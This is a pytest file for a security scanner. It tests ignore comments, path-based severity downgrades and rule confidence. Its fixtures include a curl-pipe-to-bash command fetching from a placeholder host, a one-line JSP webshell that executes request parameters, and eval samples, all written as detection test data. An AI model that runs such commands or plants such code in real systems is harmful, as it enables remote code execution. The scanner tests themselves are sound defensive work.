"""False-positive controls: argus-ignore comments, test/docs context and rule confidence."""

from __future__ import annotations

from pathlib import Path

import pytest

from argus_languages.models import Severity
from argus_languages.noise import parse_ignore, path_context
from argus_languages.rules_loader import _parse_yaml_rules, load_rules_from_dir
from argus_languages.scanner import scan_path

PASSWORD_LINE = 'password = "hunter2hunter2"'


def _write(root: Path, relative: str, text: str) -> None:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def _by_rule(root: Path, rule_id: str):
    result = scan_path(root)
    return result, [f for f in result.findings if f.rule_id == rule_id]


# ── path context ────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("relative", "expected"),
    [
        ("app/models.py", ""),
        ("src/latest/handler.py", ""),
        ("contest/app.py", ""),
        ("tests/test_api.py", "test"),
        ("pkg/__tests__/a.js", "test"),
        ("test_login.py", "test"),
        ("api/user_test.go", "test"),
        ("src/button.test.tsx", "test"),
        ("src/button.spec.js", "test"),
        ("src/main/java/UserServiceTest.java", "test"),
        ("spec/models/user_spec.rb", "test"),
        ("testdata/payload.py", "test"),
        ("docs/quickstart.py", "docs"),
        ("examples/basic/app.js", "docs"),
        ("public/vendor.min.js", "generated"),
        ("static/app.bundle.js", "generated"),
    ],
)
def test_path_context(relative: str, expected: str) -> None:
    assert path_context(relative) == expected


def test_findings_in_tests_are_downgraded(tmp_path: Path) -> None:
    _write(tmp_path, "app/settings.py", PASSWORD_LINE + "\n")
    _write(tmp_path, "tests/test_settings.py", PASSWORD_LINE + "\n")
    _, findings = _by_rule(tmp_path, "hardcoded-password")
    by_file = {f.file: f for f in findings}

    assert by_file["app/settings.py"].severity == Severity.HIGH
    assert by_file["app/settings.py"].context == ""
    assert by_file["tests/test_settings.py"].severity == Severity.MEDIUM
    assert by_file["tests/test_settings.py"].context == "test"


def test_provider_keys_keep_severity_in_tests(tmp_path: Path) -> None:
    _write(tmp_path, "tests/test_client.py", 'KEY = "sk-' + "a" * 32 + '"\n')
    _, findings = _by_rule(tmp_path, "ml-openai-key-inline")
    assert findings and findings[0].severity == Severity.CRITICAL
    assert findings[0].context == ""


def test_malware_rules_keep_severity_in_tests(tmp_path: Path) -> None:
    _write(tmp_path, "tests/fixtures/install.sh", "curl -s https://x.example/i | bash\n")
    _, findings = _by_rule(tmp_path, "malware-curl-pipe-shell")
    assert findings and findings[0].severity == Severity.HIGH
    assert findings[0].context == ""


# ── argus-ignore ────────────────────────────────────────────────────────────


def test_parse_ignore() -> None:
    assert parse_ignore("x = 1") is None
    marker = parse_ignore("x = y  # argus-ignore[a, b]: fixture value")
    assert marker is not None
    assert marker.rules == frozenset({"a", "b"})
    assert marker.reason == "fixture value"
    assert marker.covers("a") and not marker.covers("c")

    every = parse_ignore("/* argus-ignore: generated stub */")
    assert every is not None and every.rules is None
    assert every.reason == "generated stub"

    assert parse_ignore("// argus-ignore").reason == ""  # type: ignore[union-attr]


def test_same_line_ignore_with_reason(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "app/settings.py",
        PASSWORD_LINE + "  # argus-ignore[hardcoded-password]: local dev default\n",
    )
    result, findings = _by_rule(tmp_path, "hardcoded-password")
    assert findings == []
    assert result.metadata["suppressed_count"] == 1
    assert result.metadata["suppressed"][0] == {
        "rule_id": "hardcoded-password",
        "file": "app/settings.py",
        "line": 1,
        "reason": "local dev default",
    }


def test_ignore_on_the_line_above(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "app/settings.py",
        "# argus-ignore: placeholder replaced at deploy time\n" + PASSWORD_LINE + "\n",
    )
    _, findings = _by_rule(tmp_path, "hardcoded-password")
    assert findings == []


def test_ignore_above_only_covers_the_next_line(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "app/settings.py",
        "# argus-ignore: placeholder\n" + PASSWORD_LINE + "\n" + PASSWORD_LINE + "\n",
    )
    _, findings = _by_rule(tmp_path, "hardcoded-password")
    assert [f.line for f in findings] == [3]


def test_ignore_without_reason_is_not_applied(tmp_path: Path) -> None:
    _write(tmp_path, "app/settings.py", PASSWORD_LINE + "  # argus-ignore\n")
    result, findings = _by_rule(tmp_path, "hardcoded-password")
    assert len(findings) == 1
    assert "add a reason" in findings[0].description
    assert "suppressed_count" not in result.metadata


def test_ignore_for_another_rule_does_not_apply(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "app/settings.py",
        PASSWORD_LINE + "  # argus-ignore[injection-eval]: not this one\n",
    )
    _, findings = _by_rule(tmp_path, "hardcoded-password")
    assert len(findings) == 1


def test_malware_rules_cannot_be_ignored_inline(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "install.sh",
        "curl -s https://x.example/i | bash  # argus-ignore: totally fine\n",
    )
    result, findings = _by_rule(tmp_path, "malware-curl-pipe-shell")
    assert len(findings) == 1
    suppressed = {s["rule_id"] for s in result.metadata.get("suppressed", [])}
    assert "malware-curl-pipe-shell" not in suppressed


# ── confidence ──────────────────────────────────────────────────────────────


def test_bundled_rules_have_valid_confidence() -> None:
    rules = {r.id: r for r in load_rules_from_dir()}
    assert {r.confidence for r in rules.values()} <= {"high", "medium", "low"}
    assert rules["db-knex-raw"].confidence == "low"
    assert rules["hardcoded-password"].confidence == "medium"


def test_findings_carry_confidence(tmp_path: Path) -> None:
    _write(tmp_path, "db.js", "knex.raw('select 1')\n")
    _, findings = _by_rule(tmp_path, "db-knex-raw")
    assert findings and findings[0].confidence == "low"
    assert findings[0].to_dict()["confidence"] == "low"


def test_invalid_confidence_is_rejected() -> None:
    with pytest.raises(ValueError, match="confidence"):
        _parse_yaml_rules(
            [{"id": "x", "title": "x", "pattern": "x", "confidence": "certain"}], "custom.yaml"
        )


def test_custom_malware_file_rules_are_hardened() -> None:
    (rule,) = _parse_yaml_rules(
        [{"id": "x", "title": "x", "pattern": "x", "inline_ignore": True}], "malware.yaml"
    )
    assert rule.allow_inline_ignore is False
    assert rule.context_sensitive is False


# ── injection-eval: method calls are not eval (real-world false positive) ───


@pytest.mark.parametrize(
    "code",
    [
        "const [count, ttl] = await this.redis.eval(HIT_SCRIPT, 1, key);",
        "const m = /token=([a-f0-9]{64})/.exec(text);",
        "result = conn.eval(LUA_SCRIPT, 0)",
    ],
)
def test_eval_method_calls_are_not_flagged(tmp_path: Path, code: str) -> None:
    _write(tmp_path, "svc.ts" if "const" in code else "svc.py", code + "\n")
    _, findings = _by_rule(tmp_path, "injection-eval")
    assert findings == []


@pytest.mark.parametrize(
    "code", ["eval(user_input)", "window.eval(code);", "globalThis.eval(code);", "exec(source)"]
)
def test_real_eval_is_still_flagged(tmp_path: Path, code: str) -> None:
    _write(tmp_path, "svc.js" if code.endswith(";") else "svc.py", code + "\n")
    _, findings = _by_rule(tmp_path, "injection-eval")
    assert len(findings) == 1


# ── JSP webshell rule only applies to .jsp pages (was firing on every .java file) ───


def test_processbuilder_in_java_is_not_a_jsp_webshell(tmp_path: Path) -> None:
    _write(tmp_path, "Runner.java", 'Process p = new ProcessBuilder("git", "status").start();\n')
    _write(tmp_path, "cmd.jsp", '<% Runtime.getRuntime().exec(request.getParameter("c")); %>\n')
    _, findings = _by_rule(tmp_path, "malware-jsp-webshell")
    assert [(f.file, f.severity) for f in findings] == [("cmd.jsp", Severity.CRITICAL)]
